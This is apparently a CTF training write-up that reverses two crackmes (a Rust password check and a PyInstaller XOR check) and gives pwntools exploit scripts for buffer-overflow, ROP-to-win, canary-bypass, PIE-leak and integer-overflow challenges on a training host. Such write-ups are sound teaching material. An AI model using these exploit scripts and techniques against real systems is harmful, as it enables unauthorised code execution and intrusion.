# Reverse Engineer

## BabyRust0
Open with IDA Pro. We check the `main::main()` function.

```c
void __fastcall __noreturn main::main(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        char a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        int a27,
        int a28,
        int a29,
        int a30,
        int a31,
        int a32,
        int a33,
        int a34,
        int a35,
        int a36,
        struct _Unwind_Exception *a37,
        int a38)
{
  __int64 v38; // rax
  __int64 v39; // rax
  __int64 v40; // rdx
  __int64 v41; // rax
  __int64 v42; // rdx
  _BYTE *v43; // rax
  unsigned __int64 v44; // rdx
  _BYTE v45[48]; // [rsp+48h] [rbp-C0h] BYREF
  _BYTE v46[24]; // [rsp+78h] [rbp-90h] BYREF
  __int64 v47; // [rsp+90h] [rbp-78h]
  _BYTE v48[48]; // [rsp+98h] [rbp-70h] BYREF
  _BYTE v49[64]; // [rsp+C8h] [rbp-40h] BYREF

  while ( 1 )
  {
    core::fmt::rt::<impl core::fmt::Arguments>::new_const(v45, &off_5555555AEB70);
    std::io::stdio::_print();
    alloc::string::String::new(v46);
    std::io::stdio::stdin();
    v47 = v38;
    std::io::stdio::Stdin::read_line();
    core::result::Result<T,E>::expect(v39, v40, aFailedToReadLi, 19LL, &off_5555555AEB80);
    v41 = <alloc::string::String as core::ops::deref::Deref>::deref(v46);
    v43 = (_BYTE *)core::str::<impl str>::trim(v41, v42);
    if ( main::check(v43, v44) )
      break;
    core::fmt::rt::<impl core::fmt::Arguments>::new_const(v49, &off_5555555AEB98);
    std::io::stdio::_print();
    core::ptr::drop_in_place<alloc::string::String>(v46);
  }
  core::fmt::rt::<impl core::fmt::Arguments>::new_const(v48, &off_5555555AEBA8);
  std::io::stdio::_print();
  std::process::exit();
}
```

Notice the `main::check()` function. It pass `v43, v44` as argument. That is the function to check the password correct or not.

```c
bool __fastcall main::check(_BYTE *a1, unsigned __int64 a2)
{
  if ( core::str::<impl str>::len() == 22 )
  {
    if ( !a2 )
      core::panicking::panic_bounds_check();
    if ( *a1 == 66 )
    {
      if ( a2 <= 1 )
        core::panicking::panic_bounds_check();
      if ( a1[1] == 75 )
      {
        if ( a2 <= 2 )
          core::panicking::panic_bounds_check();
        if ( a1[2] == 83 )
        {
          if ( a2 <= 3 )
            core::panicking::panic_bounds_check();
          if ( a1[3] == 69 )
          {
            if ( a2 <= 4 )
              core::panicking::panic_bounds_check();
            if ( a1[4] == 67 )
            {
              if ( a2 <= 5 )
                core::panicking::panic_bounds_check();
              if ( a1[5] == 123 )
              {
                if ( a2 <= 6 )
                  core::panicking::panic_bounds_check();
                if ( a1[6] == 119 )
                {
                  if ( a2 <= 7 )
                    core::panicking::panic_bounds_check();
                  if ( a1[7] == 51 )
                  {
                    if ( a2 <= 8 )
                      core::panicking::panic_bounds_check();
                    if ( a1[8] == 108 )
                    {
                      if ( a2 <= 9 )
                        core::panicking::panic_bounds_check();
                      if ( a1[9] == 67 )
                      {
                        if ( a2 <= 0xA )
                          core::panicking::panic_bounds_check();
                        if ( a1[10] == 48 )
                        {
                          if ( a2 <= 0xB )
                            core::panicking::panic_bounds_check();
                          if ( a1[11] == 109 )
                          {
                            if ( a2 <= 0xC )
                              core::panicking::panic_bounds_check();
                            if ( a1[12] == 51 )
                            {
                              if ( a2 <= 0xD )
                                core::panicking::panic_bounds_check();
                              if ( a1[13] == 95 )
                              {
                                if ( a2 <= 0xE )
                                  core::panicking::panic_bounds_check();
                                if ( a1[14] == 116 )
                                {
                                  if ( a2 <= 0xF )
                                    core::panicking::panic_bounds_check();
                                  if ( a1[15] == 79 )
                                  {
                                    if ( a2 <= 0x10 )
                                      core::panicking::panic_bounds_check();
                                    if ( a1[16] == 95 )
                                    {
                                      if ( a2 <= 0x11 )
                                        core::panicking::panic_bounds_check();
                                      if ( a1[17] == 82 )
                                      {
                                        if ( a2 <= 0x12 )
                                          core::panicking::panic_bounds_check();
                                        if ( a1[18] == 101 )
                                        {
                                          if ( a2 <= 0x13 )
                                            core::panicking::panic_bounds_check();
                                          if ( a1[19] == 118 )
                                          {
                                            if ( a2 <= 0x14 )
                                              core::panicking::panic_bounds_check();
                                            if ( a1[20] == 118 )
                                            {
                                              if ( a2 <= 0x15 )
                                                core::panicking::panic_bounds_check();
                                              return a1[21] == 125;
                                            }
                                            else
                                            {
                                              return 0;
                                            }
                                          }
                                          else
                                          {
                                            return 0;
                                          }
                                        }
                                        else
                                        {
                                          return 0;
                                        }
                                      }
                                      else
                                      {
                                        return 0;
                                      }
                                    }
                                    else
                                    {
                                      return 0;
                                    }
                                  }
                                  else
                                  {
                                    return 0;
                                  }
                                }
                                else
                                {
                                  return 0;
                                }
                              }
                              else
                              {
                                return 0;
                              }
                            }
                            else
                            {
                              return 0;
                            }
                          }
                          else
                          {
                            return 0;
                          }
                        }
                        else
                        {
                          return 0;
                        }
                      }
                      else
                      {
                        return 0;
                      }
                    }
                    else
                    {
                      return 0;
                    }
                  }
                  else
                  {
                    return 0;
                  }
                }
                else
                {
                  return 0;
                }
              }
              else
              {
                return 0;
              }
            }
            else
            {
              return 0;
            }
          }
          else
          {
            return 0;
          }
        }
        else
        {
          return 0;
        }
      }
      else
      {
        return 0;
      }
    }
    else
    {
      return 0;
    }
  }
  else
  {
    return 0;
  }
}
```

Pretty straight forward. Each character compares with an ASCII value. We can convert it back using a simple python script.

```py
flag_chr = [
    66,
    75,
    83,
    69,
    67,
    123,
    119,
    51,
    108,
    67,
    48,
    109,
    51,
    95,
    116,
    79,
    95,
    82,
    101,
    118,
    118,
    125,
]

flag = ""

for i in flag_chr:
    flag = flag + chr(i)

print(flag)
```

Flag: `BKSEC{w3lC0m3_tO_Revv}`

## pyxe
This .exe file is compiled by `pyinstall`, a python library. I tried to decompile it using IDA Pro but it became too hard to understand.  

So I do a little research online.  

Found a tutorial: `https://github.com/BarakAharoni/pycDcode`.  

First I extracted `.pyc` in this `.exe` using a script I found in Github: `https://github.com/extremecoders-re/pyinstxtractor/blob/master/pyinstxtractor.py`

Then I use `uncompyle6` to decompile the .pyc file into the original .py file. Now it became an easy crackme problem.  

```py
# uncompyle6 version 3.9.3
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.13.7 (main, Aug 20 2025, 22:17:40) [GCC 14.3.0]
# Embedded file name: chall.py


def xor_encrypt(plaintext, key):
    plaintext_bytes = plaintext.encode()
    key_bytes = key.encode()
    key_repeated = (
        key_bytes * (len(plaintext_bytes) // len(key_bytes))
        + key_bytes[: len(plaintext_bytes) % len(key_bytes)]
    )
    encrypted_bytes = bytes([a ^ b for a, b in zip(plaintext_bytes, key_repeated)])
    return encrypted_bytes.hex()


def main():
    encrypted_hex = "73796071764d47410a1c001e074d53680a0903066c0507690501665e594e"
    key = "123456789"
    input_password = input("Input password > ")
    encrypted_input = xor_encrypt(input_password, key)
    if encrypted_input == encrypted_hex:
        print("Correct password! Access successful!")
    else:
        print("Wrong password! Access Denied!")


if __name__ == "__main__":
    main()

# okay decompiling chall.pyc
```

Pretty straight forward, a simple xor decryption with key provided. I wrote a little script to decrypt the flag.

```py
def xor_decrypt(target, key) -> str:
    target_bytes = bytes.fromhex(target)
    target_text = target_bytes.decode("utf-8")
    key_bytes = key.encode()
    key_repeated = (
        key_bytes * (len(target_bytes) // len(key_bytes))
        + key_bytes[: len(target_bytes) % len(key_bytes)]
    )
    decrypted_bytes = bytes([a ^ b for a, b in zip(target_bytes, key_repeated)])

    return decrypted_bytes.decode("utf-8")


TARGET = "73796071764d47410a1c001e074d53680a0903066c0507690501665e594e"
KEY = "123456789"

print(xor_decrypt(TARGET, KEY))
```

Flag: `BKSEC{py3-2-3xe_2024_12_29_ok}`  

# Pwn

## Introduction to pwntools

Challenge:  
![alt text](image.png)  

Exploit script:  

```py
from pwn import *

p = remote("103.77.175.40", 6996)

payload = bytes([0x13, 0x14, 0x15, 0x16])
print(payload)

p.sendline(payload)

p.interactive()
```

Flag: `BKSEC{pwntools_1z_s0_good_r1ght}`

## bof_1

Basic file information:
```bash
bof_1: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7c86e6d1e3c0f306e4e8fde2fb93237d74e4ee34, for GNU/Linux 3.2.0, not stripped
```
```bash
pwn checksec bof_1
[*] '/mnt/e/ctf-chall/bksec_training/pwn/bof_1/bof_1'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

For pwn challenge, I use `Cutter` to disassemble the binary.  

![alt text](image-1.png)

We can calculate the offset from `s` to `var_ch`. My mission is change `var_ch` value to `0x13141516`. I wrote a simple python script to exploit.  

```py
from pwn import *

p = remote("103.77.175.40", 6001)

offset = 0x58 - 0xc

payload = b"A" * offset + p32(0x13141516)

p.sendline(payload)
p.interactive()
```

Flag: `BKSEC{\xBuffer\xOv3rfl0w\x1s\xC00l}`

## bof_2

![alt text](image-2.png)

`main()` function:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[8]; // [rsp+0h] [rbp-40h] BYREF
  __int64 v5; // [rsp+8h] [rbp-38h]
  __int64 v6; // [rsp+10h] [rbp-30h]
  __int64 v7; // [rsp+18h] [rbp-28h]
  __int64 v8; // [rsp+20h] [rbp-20h]
  __int64 v9; // [rsp+28h] [rbp-18h]
  __int16 v10; // [rsp+30h] [rbp-10h]

  setbuf(stdout, 0LL);
  *(_QWORD *)s = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0;
  printf("Enter your favorite number: ");
  fgets(s, 256, stdin);
  return 0;
}
```

There is a buffer overflow vulnerabily. I found offset to `rsp` using `Cutter`, `pwndbg`, `IDA Pro`, anything is fine.

`offset = 72`

PIE and Canary are off. I found `win()` function.

![alt text](image-3.png)

We care about `win()` address: `0x00000000004011F3`.

However, it's a little tricky. This is `win()`.

```c
int __fastcall win(const char *a1, const char *a2)
{
  if ( a1 != (const char *)0xDEADBEEFDEADBEEFLL || a2 != (const char *)0xDEADBEEFDEADBEEFLL )
  {
    puts("!!! Access denied");
    printf("Entered param1: %s\n", a1);
    printf("Entered param2: %s\n", a2);
    exit(1);
  }
  return system("/bin/sh");
}
```

Use `ROPgadget` to get gadget address, here we need to know x86 calling convention.  

Write a python script to exploit this challenge.  

```py
from pwn import *

p = process("./bof_2")
p = remote("103.77.175.40", 6011)

win_addr = 0x004011F3
offset = 72
ret_gadget = 0x000000000040101A
pop_rdi_ret = 0x00000000004011E5
pop_rsi_ret = 0x00000000004011EE

target = 0xDEADBEEFDEADBEEF

payload = b"A" * offset
payload += p64(pop_rdi_ret)
payload += p64(target)
payload += p64(pop_rsi_ret)
payload += p64(target)
payload += p64(ret_gadget)
payload += p64(win_addr)

p.sendline(payload)

p.interactive()
```

Flag: `BKSEC{2-->upgr4d3\xBuffer\xOv3rfl0w\x1s\xn0t\xC00l\xhixxxxxxxxxxx}`  

Refers to this Gemini chat: `https://gemini.google.com/share/1c614a9c1c42`

## bof_3
```bash
$ file bof_3
bof_3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1321e18dfd3016f10564ab4b7707bf538d5f597a, for GNU/Linux 3.2.0, not stripped
```
```bash
$ pwn checksec bof_3
[*] '/mnt/e/ctf-chall/bksec_training/pwn/bof_3/bof_3'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Idk why but Cutter is better than Ghidra or IDA when solving pwn problem. Better use it.

Disassembly by Cutter:

![alt text](image-4.png)

This problem have a bof with canary vuln. Luckily we have been given the canary. So we need to bypass it.

```py
from pwn import *

# p = process("./bof_3")
p = remote("103.77.175.40", 6021)

p.recvuntil(b"My favorite canary is: ")
canary = int(p.recvline()[:-1].decode("utf-8"), 0)
print(hex(canary))

to_canary_offset = 0x68 - 0x10
canary_to_rsp_offset = 0x10 - 8
win_addr = 0x0000000000401213
ret_gadget = 0x000000000040101A
pop_rdi_ret = 0x0000000000401205
pop_rsi_ret = 0x000000000040120E


# Because we need 8 bytes padding to go to rsp.
# So i added b'A'*8. I stuck here a while.
# 1 byte = 8 bit => 8 bytes = 64 bits.
payload = b"A" * to_canary_offset + p64(canary) + b"A" * canary_to_rsp_offset
payload += p64(pop_rdi_ret) + p64(0xDEADBEEFDEADBEEF)
payload += p64(pop_rsi_ret) + p64(0xDEADBEEFDEADBEEF)
payload += p64(ret_gadget) + p64(win_addr)

p.sendline(payload)
p.interactive()
```

Flag: `BKSEC{W3_4LL_Hat3_tH4_d4mn_c4NARY}`.

![alt text](image-5.png)

## int_1
Basic file information:

```bash
$ file int_1
int_1: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f200e5bb10bc777e114e8de0418256012f6dabdd, for GNU/Linux 3.2.0, not stripped
```
```bash
$ pwn checksec int_1
[*] '/mnt/e/ctf-chall/bksec_training/pwn/int_1/int_1'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

`main()` decompile by IDA Pro:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-14h] BYREF
  int v5; // [rsp+10h] [rbp-10h] BYREF
  int v6; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  printf("Enter the first positive number: ");
  __isoc99_scanf("%d", &v4);
  if ( v4 >= 0 )
  {
    printf("Enter the second positive number: ");
    __isoc99_scanf("%d", &v5);
    if ( v5 >= 0 )
    {
      puts("=====================================");
      puts("I would try to sum these two numbers!");
      puts("=====================================");
      v6 = v4 + v5;
      printf("Our answer is  %d\n", v4 + v5);
      if ( v6 >= 0 )
      {
        puts("Your sum is not negative, great!");
      }
      else
      {
        puts("Hmm something is wrong with this calculator");
        system("/bin/sh");
      }
      return 0;
    }
    else
    {
      puts("Second number cannot be negative.");
      return 1;
    }
  }
  else
  {
    puts("First number cannot be negative.");
    return 1;
  }
}
```

A simple integer overflow challenge. Because I'm unemployed so I write a python script to solve this.

```py
from pwn import *

p = remote("103.77.175.40", 6051)

payload = b"2147483647"
p.sendline(payload)
p.sendline(payload)
p.interactive()
```

Flag: `BKSEC{maTh_1s_7hE_woR57_thIn6_EveRrr}`.

![alt text](image-6.png)

## bof_4
Basic file information:

```bash
$ file bof_4
bof_4: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=59000cf22e82083de57e56e0e9bf86524176a5ed, for GNU/Linux 3.2.0, not stripped
```
```bash
$ pwn checksec bof_4
[*] '/mnt/e/ctf-chall/bksec_training/pwn/bof_4/bof_4'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

This problem have `PIE enabled`. But it leaked the base address itself.

```bash
$ ./bof_4
Wait a second til i eat my PIE!
...
Opps! 0x5933016f5000
...
Enter your favorite number: nig

```

Variable address I get using Cutter:

![alt text](image-8.png)

Decompile using IDA Pro:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[8]; // [rsp+0h] [rbp-60h] BYREF
  __int64 v5; // [rsp+8h] [rbp-58h]
  __int64 v6; // [rsp+10h] [rbp-50h]
  __int64 v7; // [rsp+18h] [rbp-48h]
  __int64 v8; // [rsp+20h] [rbp-40h]
  __int64 v9; // [rsp+28h] [rbp-38h]
  __int64 v10; // [rsp+30h] [rbp-30h]
  __int64 v11; // [rsp+38h] [rbp-28h]
  __int64 v12; // [rsp+40h] [rbp-20h]
  __int64 v13; // [rsp+48h] [rbp-18h]
  int *v14; // [rsp+58h] [rbp-8h]

  setbuf(_bss_start, 0LL);
  *(_QWORD *)s = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  v13 = 0LL;
  v14 = &dword_0;
  puts("Wait a second til i eat my PIE!");
  puts("...");
  printf("Opps! %p\n", &dword_0);
  puts("...");
  printf("Enter your favorite number: ");
  fgets(s, 256, stdin);
  return 0;
}

int __fastcall win(const char *a1, const char *a2)
{
  if ( a1 != (const char *)-2401053088876216593LL || a2 != (const char *)0xDEADBEEFDEADBEEFLL )
  {
    puts("!!! Access denied");
    printf("Entered param1: %s\n", a1);
    printf("Entered param2: %s\n", a2);
    exit(1);
  }
  return system("/bin/sh");
}
```

We have the base address. Now it became a simple bof challenge. Just add the base address before gadget/static address and we can hijack the program execution flow.

This is a python script I write to exploit this challenge.

```py
from pwn import *

# p = process("./bof_4")
p = remote("103.77.175.40", 6031)

p.recvuntil(b"Opps! ")

static_addr = 0x555555554000 - 0x555555554000
dynamic_addr = int(p.recvline()[:-1].decode("utf-8"), 0)

base_addr = dynamic_addr - static_addr

win_addr = 0x00001206 + base_addr
pop_rdi_ret = base_addr + 0x00000000000011F8
pop_rsi_ret = base_addr + 0x0000000000001201
ret_addr = base_addr + 0x000000000000101A

target = 0xDEADBEEFDEADBEEF
offset = 0x68

payload = b"A" * offset
payload += p64(pop_rdi_ret) + p64(target)
payload += p64(pop_rsi_ret) + p64(target)
payload += p64(ret_addr) + p64(win_addr)

p.sendline(payload)
p.interactive()
```

![alt text](image-7.png)

Flag: `BKSEC{apP13_pi3_1s_D3lIC1ouS_BuT_NoT_PIE_XD}`

## shell_1

As always, basic information:

```bash
$ file shell_1
shell_1: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4df1cf3693256fd8ca59cff383938b86e90170fe, for GNU/Linux 3.2.0, not stripped
```
```bash
$ pwn checksec shell_1
[*] '/mnt/e/ctf-chall/bksec_training/pwn/shell_1/shell_1'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

